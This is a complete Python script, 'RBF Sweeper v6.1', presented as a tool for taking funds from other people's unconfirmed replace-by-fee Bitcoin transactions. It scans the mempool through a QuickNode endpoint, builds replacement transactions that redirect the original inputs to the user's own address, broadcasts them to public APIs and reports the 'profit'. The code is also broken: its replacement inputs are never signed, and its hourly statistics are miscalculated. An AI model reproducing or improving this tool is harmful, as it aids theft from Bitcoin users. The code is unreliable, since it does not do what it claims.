#!/usr/bin/env python3
"""
RBF SWEEPER v6.1 (QuickNode Edition)
Uses QuickNode for faster, more reliable mempool access.
Features:
- QuickNode integration for mempool access
- Profit estimation per hour
- Vulnerable transaction counting
- Adaptive rate limiting
- Detailed statistics
"""

import sys
import json
import hashlib
import requests
import time
import struct
import logging
import argparse
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
import base58
import random
import signal
from decimal import Decimal, InvalidOperation

# ----------------------------------------------------------------------
# CONFIG & LOGGING
# ----------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(message)s',
    handlers=[
        logging.FileHandler('rbf_sweeper.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
log = logging.getLogger("RBFSweeper")

# ----------------------------------------------------------------------
# CONSTANTS
# ----------------------------------------------------------------------
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
MIN_VALUE_SAT = 6000  # Minimum UTXO value in satoshis
FEE_RATE_FALLBACK = 10  # Fallback fee rate in sat/vB
REQUEST_DELAY = 1.0  # Base delay between API requests (seconds)
MAX_RETRIES = 3  # Maximum retries for failed requests
MAX_WORKERS = 5  # Number of parallel workers
MAX_TXS_TO_PROCESS = 1000  # Limit transactions to process
BATCH_SIZE = 20  # Process transactions in batches
SAT_PER_BTC = Decimal("100000000")
QUICKNODE_ENDPOINT = "https://greatest-billowing-grass.btc.quiknode.pro/"  # Replace with your QuickNode API key

# ----------------------------------------------------------------------
# API ENDPOINTS
# ----------------------------------------------------------------------
BROADCAST_APIS = [
    {"name": "blockstream", "url": "https://blockstream.info/api/tx", "headers": {"Content-Type": "text/plain"}},
    {"name": "blockcypher", "url": "https://api.blockcypher.com/v1/btc/main/txs/push", "json": lambda x: {"tx": x}},
]

# ----------------------------------------------------------------------
# STATISTICS
# ----------------------------------------------------------------------
class Statistics:
    def __init__(self):
        self.start_time = time.time()
        self.total_txs_checked = 0
        self.rbf_txs_found = 0
        self.successful_sweeps = 0
        self.total_profit_sat = 0
        self.processed_txs = 0

    def update(self, is_rbf=False, success=False, profit_sat=0):
        self.total_txs_checked += 1
        if is_rbf:
            self.rbf_txs_found += 1
        if success:
            self.successful_sweeps += 1
            self.total_profit_sat += profit_sat
        self.processed_txs += 1

    def get_stats(self):
        runtime = time.time() - self.start_time
        runtime_hours = runtime / 3600
        return {
            "runtime_seconds": runtime,
            "runtime_hours": runtime_hours,
            "txs_checked": self.total_txs_checked,
            "rbf_txs_found": self.rbf_txs_found,
            "successful_sweeps": self.successful_sweeps,
            "total_profit_sat": self.total_profit_sat,
            "profit_per_hour_sat": self.total_profit_sat / runtime_hours if runtime_hours > 0 else 0,
            "txs_per_hour": self.processed_txs / runtime_hours * 3600 if runtime_hours > 0 else 0,
            "rbf_per_hour": self.rbf_txs_found / runtime_hours * 3600 if runtime_hours > 0 else 0
        }

# ----------------------------------------------------------------------
# BITCOIN HELPERS
# ----------------------------------------------------------------------
class BitcoinUtils:
    @staticmethod
    def hash256(data: bytes) -> bytes:
        """Compute SHA-256(SHA-256(data))."""
        return hashlib.sha256(hashlib.sha256(data).digest()).digest()

    @staticmethod
    def base58_decode(addr: str) -> bytes:
        """Decode a Base58 address."""
        return base58.b58decode(addr)

    @staticmethod
    def scriptpubkey_from_addr(addr: str) -> bytes:
        """Generate a ScriptPubKey from a P2PKH address."""
        decoded = BitcoinUtils.base58_decode(addr)
        return b'\x76\xa9\x14' + decoded[1:-4] + b'\x88\xac'

# ----------------------------------------------------------------------
# RBF EXPLOITER
# ----------------------------------------------------------------------
class RBFSweeper:
    def __init__(self, destination_address: str):
        self.destination_address = destination_address
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "RBFSweeper/6.1"
        self.shutdown_flag = False
        self.stats = Statistics()
        signal.signal(signal.SIGINT, self._handle_interrupt)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    @staticmethod
    def _btc_to_sat(value: Any) -> Optional[int]:
        """Convert a BTC value (possibly negative) into satoshis."""
        if value is None:
            return None
        try:
            dec_value = Decimal(str(value))
        except (InvalidOperation, TypeError, ValueError):
            return None
        return int((dec_value.copy_abs() * SAT_PER_BTC).to_integral_value())

    @staticmethod
    def _is_replaceable(flag: Any) -> bool:
        if isinstance(flag, bool):
            return flag
        if isinstance(flag, str):
            return flag.lower() in {"yes", "true", "rbf", "1"}
        return False

    def _extract_fee_sat(self, tx: Dict[str, Any], mempool_info: Optional[Dict[str, Any]]) -> int:
        fee_sat: Optional[int] = None
        if "fee" in tx:
            fee_sat = self._btc_to_sat(tx.get("fee"))
        if fee_sat is None and mempool_info:
            fees = mempool_info.get("fees", {})
            fee_sat = self._btc_to_sat(fees.get("base"))
        return fee_sat if fee_sat is not None else 0

    def _extract_vsize(self, tx: Dict[str, Any], mempool_info: Optional[Dict[str, Any]]) -> int:
        if mempool_info:
            vsize = mempool_info.get("vsize")
            if isinstance(vsize, int):
                return vsize
        vsize = tx.get("vsize")
        return int(vsize) if isinstance(vsize, (int, float)) else 180

    def _extract_total_output_sat(self, tx: Dict[str, Any]) -> int:
        total = 0
        for output in tx.get("vout", []):
            value_sat = self._btc_to_sat(output.get("value"))
            if value_sat is not None:
                total += value_sat
        return total

    def _handle_interrupt(self, signum, frame):
        """Handle keyboard interrupt gracefully."""
        log.info("Shutdown requested. Finishing current batch...")
        self.shutdown_flag = True

    def _delay(self):
        """Add a random delay to avoid rate-limiting."""
        if self.shutdown_flag:
            raise KeyboardInterrupt("Shutdown requested")
        time.sleep(REQUEST_DELAY + random.uniform(0, 0.5))

    def _retry_request(self, url: str, timeout: int = 15) -> Optional[Dict]:
        """Retry a failed request with exponential backoff."""
        for i in range(MAX_RETRIES):
            if self.shutdown_flag:
                raise KeyboardInterrupt("Shutdown requested")
            try:
                r = self.session.get(url, timeout=timeout)
                if r.status_code == 200:
                    return r.json()
                elif r.status_code == 429:
                    wait_time = (2 ** i) + random.uniform(0, 1)
                    log.warning(f"Rate-limited. Retrying in {wait_time:.1f} seconds...")
                    time.sleep(wait_time)
                elif r.status_code == 404:
                    log.debug(f"Transaction not found (404): {url}")
                    return None
                else:
                    log.warning(f"Request failed: HTTP {r.status_code}")
                    time.sleep(2 ** i)
            except Exception as e:
                log.warning(f"Request failed: {e}")
                time.sleep(2 ** i)
        return None

    def fetch_mempool_txs(self) -> List[Dict[str, Any]]:
        """Fetch unconfirmed transaction IDs from QuickNode."""
        try:
            log.info("Fetching mempool transaction IDs from QuickNode...")
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getrawmempool",
                "params": [True]  # Include transaction details
            }
            r = self.session.post(QUICKNODE_ENDPOINT, json=payload, timeout=30)
            if r.status_code == 200:
                data = r.json()
                mempool = data.get("result", {})
                entries = []
                for txid, info in mempool.items():
                    entries.append({"txid": txid, "mempool_info": info})
                log.info(f"Found {len(entries)} unconfirmed transactions in mempool.")
                return entries[:MAX_TXS_TO_PROCESS]
            else:
                log.error(f"QuickNode request failed: HTTP {r.status_code}")
                return []
        except Exception as e:
            log.error(f"Failed to fetch mempool transactions: {e}")
            return []

    def check_rbf_status(self, txid: str, mempool_info: Optional[Dict[str, Any]] = None) -> Optional[Dict[str, Any]]:
        """Check if a transaction is RBF-enabled using QuickNode."""
        if mempool_info and not self._is_replaceable(mempool_info.get("bip125-replaceable")):
            return None
        try:
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getrawtransaction",
                "params": [txid, True]
            }
            r = self.session.post(QUICKNODE_ENDPOINT, json=payload, timeout=15)
            if r.status_code != 200:
                return None
            data = r.json()
            tx = data.get("result", {})
            is_replaceable = self._is_replaceable(tx.get("bip125-replaceable"))
            if not is_replaceable and mempool_info:
                is_replaceable = self._is_replaceable(mempool_info.get("bip125-replaceable"))
            if not is_replaceable:
                return None

            fee_sat = self._extract_fee_sat(tx, mempool_info)
            total_output_sat = self._extract_total_output_sat(tx)
            vsize = self._extract_vsize(tx, mempool_info)

            return {
                "txid": txid,
                "fee": fee_sat,
                "value": total_output_sat,
                "vsize": vsize,
                "mempool_info": mempool_info or {}
            }
        except Exception as e:
            log.warning(f"Failed to check RBF status for {txid}: {e}")
            return None

    def process_batch(self, entries: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Process a batch of transaction entries for RBF status."""
        rbf_txs: List[Dict[str, Any]] = []
        for entry in entries:
            if self.shutdown_flag:
                break
            self._delay()
            self.stats.update()
            txid = entry["txid"]
            mempool_info = entry.get("mempool_info")
            if not self._is_replaceable(mempool_info.get("bip125-replaceable")):
                continue
            result = self.check_rbf_status(txid, mempool_info)
            if result:
                rbf_txs.append(result)
                log.info(
                    f"Found RBF-enabled transaction: {txid[:16]}... "
                    f"(Value: {result['value']} sat, Fee: {result['fee']} sat)"
                )
        return rbf_txs

    def fetch_rbf_txs(self, entries: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Fetch RBF-enabled transactions in batches."""
        rbf_txs: List[Dict[str, Any]] = []
        for i in range(0, len(entries), BATCH_SIZE):
            if self.shutdown_flag:
                break
            batch = entries[i:i + BATCH_SIZE]
            log.info(f"Processing batch {i // BATCH_SIZE + 1} ({len(batch)} transactions)...")
            rbf_txs.extend(self.process_batch(batch))
            if self.shutdown_flag:
                break
        return rbf_txs

    def build_rbf_tx(self, tx_data: Dict[str, Any], fee_rate: int) -> Optional[Tuple[str, int]]:
        """Build a replacement transaction skeleton."""
        try:
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getrawtransaction",
                "params": [tx_data["txid"], True]
            }
            r = self.session.post(QUICKNODE_ENDPOINT, json=payload, timeout=15)
            if r.status_code != 200:
                log.error(f"Failed to fetch transaction details for {tx_data['txid']}")
                return None

            tx = r.json().get("result", {})
            vin_entries = tx.get("vin", [])
            if not vin_entries:
                log.warning("Transaction has no inputs; skipping")
                return None

            original_fee = tx_data.get("fee", 0)
            total_output = tx_data.get("value", 0)
            total_in = total_output + original_fee
            vsize = tx_data.get("vsize") or 180

            target_fee = max(fee_rate * vsize, original_fee + 1000)
            if target_fee >= total_in:
                log.warning(
                    f"Calculated fee ({target_fee} sat) is not less than total input ({total_in} sat); skipping"
                )
                return None

            out_val = total_in - target_fee
            if out_val <= 546:
                log.warning(f"Output value too low after fee: {out_val} satoshis")
                return None

            tx_ins = []
            for txin in vin_entries:
                prev_hash = bytes.fromhex(txin["txid"])[::-1]
                prev_idx = struct.pack("<I", txin["vout"])
                sequence = struct.pack("<I", txin.get("sequence", 0xfffffffd))
                tx_ins.append(prev_hash + prev_idx + b"\x00" + sequence)

            pk_script = BitcoinUtils.scriptpubkey_from_addr(self.destination_address)
            output = struct.pack("<Q", out_val) + bytes([len(pk_script)]) + pk_script

            raw_tx = (
                b"\x02\x00\x00\x00" +
                bytes([len(tx_ins)]) +
                b"".join(tx_ins) +
                b"\x01" +
                output +
                b"\x00\x00\x00\x00"
            ).hex()

            profit_sat = out_val
            return raw_tx, profit_sat
        except Exception as e:
            log.error(f"RBF build failed: {e}")
            return None

    def broadcast_rbf_tx(self, raw_tx: str) -> Dict[str, Any]:
        """Broadcast the RBF transaction to multiple APIs."""
        results: Dict[str, Any] = {}
        for api in BROADCAST_APIS:
            if self.shutdown_flag:
                break
            try:
                self._delay()
                if "json" in api:
                    payload = api["json"](raw_tx)
                    r = self.session.post(api["url"], json=payload, timeout=15)
                else:
                    r = self.session.post(api["url"], data=raw_tx, headers=api["headers"], timeout=15)
                results[api["name"]] = {
                    "status": "success" if r.status_code in (200, 201) else "error",
                    "code": r.status_code,
                    "text": r.text[:120]
                }
                if results[api["name"]]["status"] == "success":
                    log.info(f"Successfully broadcast to {api['name']}")
                    break
            except Exception as e:
                results[api["name"]] = {"error": str(e)}
                log.warning(f"Failed to broadcast to {api['name']}: {e}")
        return results

    def execute_rbf_sweep(self, tx_data: Dict[str, Any], fee_rate: int) -> Dict[str, Any]:
        """Execute an RBF sweep for a given transaction."""
        txid = tx_data.get("txid")
        if not txid:
            return {"status": "error", "error": "Invalid transaction data"}

        log.info(f"Building RBF transaction for {txid}...")
        result = self.build_rbf_tx(tx_data, fee_rate)
        if not result:
            self.stats.update(is_rbf=True, success=False)
            return {"status": "error", "error": "Failed to build RBF transaction"}

        raw_tx, profit_sat = result

        log.info(f"Broadcasting RBF transaction for {txid} (Profit: {profit_sat} sat)...")
        broadcast = self.broadcast_rbf_tx(raw_tx)

        success = any(v.get("status") == "success" for v in broadcast.values())
        if success:
            self.stats.update(is_rbf=True, success=True, profit_sat=profit_sat)
            log.info(f"SUCCESS -> Profit: {profit_sat} sat")
        else:
            self.stats.update(is_rbf=True, success=False)
            log.warning(f"Failed to sweep {txid}")

        return {
            "status": "success" if success else "error",
            "original_txid": txid,
            "rbf_txid": BitcoinUtils.hash256(bytes.fromhex(raw_tx))[::-1].hex(),
            "raw_tx": raw_tx,
            "profit_sat": profit_sat,
            "broadcast": broadcast,
            "timestamp": datetime.now().isoformat()
        }

    def run(self, fee_rate: int) -> List[Dict[str, Any]]:
        """Run the RBF sweeper: scan mempool and execute sweeps."""
        log.info(f"Scanning mempool for RBF-enabled transactions (max {MAX_TXS_TO_PROCESS})...")

        entries = self.fetch_mempool_txs()
        if not entries:
            log.info("No transactions found in mempool.")
            return []

        log.info(f"Checking {len(entries)} transactions for RBF status in batches of {BATCH_SIZE}...")
        rbf_txs = self.fetch_rbf_txs(entries)
        if not rbf_txs:
            log.info("No RBF-enabled transactions found in mempool.")
            return []

        log.info(f"Found {len(rbf_txs)} RBF-enabled transactions.")

        results: List[Dict[str, Any]] = []
        for i, tx_data in enumerate(rbf_txs):
            if self.shutdown_flag:
                break
            self._delay()
            log.info(
                f"Processing RBF transaction {i + 1}/{len(rbf_txs)}: {tx_data['txid'][:16]}... "
                f"(Value: {tx_data['value']} sat, Fee: {tx_data['fee']} sat)"
            )

            res = self.execute_rbf_sweep(tx_data, fee_rate)
            results.append(res)

        return results

    def print_stats(self):
        """Print statistics about the run."""
        stats = self.stats.get_stats()
        log.info("\n=== STATISTICS ===")
        log.info(f"Runtime: {stats['runtime_seconds']:.1f} seconds ({stats['runtime_hours']:.2f} hours)")
        log.info(f"Transactions checked: {stats['txs_checked']} ({stats['txs_per_hour']:.1f}/hour)")
        log.info(f"RBF transactions found: {stats['rbf_txs_found']} ({stats['rbf_per_hour']:.1f}/hour)")
        log.info(f"Successful sweeps: {stats['successful_sweeps']}")
        log.info(f"Total profit: {stats['total_profit_sat']} sat ({stats['profit_per_hour_sat']:.1f} sat/hour)")
        log.info("================")

# ----------------------------------------------------------------------
# CLI
# ----------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="RBF Sweeper v6.1 - QuickNode Edition with Profit Estimation"
    )
    parser.add_argument("destination", help="Destination P2PKH address")
    parser.add_argument("--fee-rate", type=int, default=10, help="Fee rate in sat/vB (default: 10)")
    parser.add_argument("--output", type=str, default="rbf_results.json", help="Output file (default: rbf_results.json)")
    args = parser.parse_args()

    if "your-api-key-here" in QUICKNODE_ENDPOINT:
        log.error("Please replace 'your-api-key-here' in the QUICKNODE_ENDPOINT with your actual QuickNode API key")
        return

    print(f"""
╔═══════════════════════════════════════════════════════════╗
║      RBF SWEEPER v6.1 (QuickNode Edition)            ║
║      Destination: {args.destination}                ║
║      Fee Rate: {args.fee_rate} sat/vB                ║
║      Max Transactions: {MAX_TXS_TO_PROCESS}          ║
║      Batch Size: {BATCH_SIZE}                        ║
╚═══════════════════════════════════════════════════════════╝
    """)

    sweeper = RBFSweeper(args.destination)
    try:
        results = sweeper.run(args.fee_rate)
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        log.info(f"Results written to {args.output}")
        sweeper.print_stats()
    except KeyboardInterrupt:
        log.info("Shutdown by user request")
        sweeper.print_stats()
    except Exception as e:
        log.error(f"Fatal error: {e}")
        raise

if __name__ == "__main__":
    main()
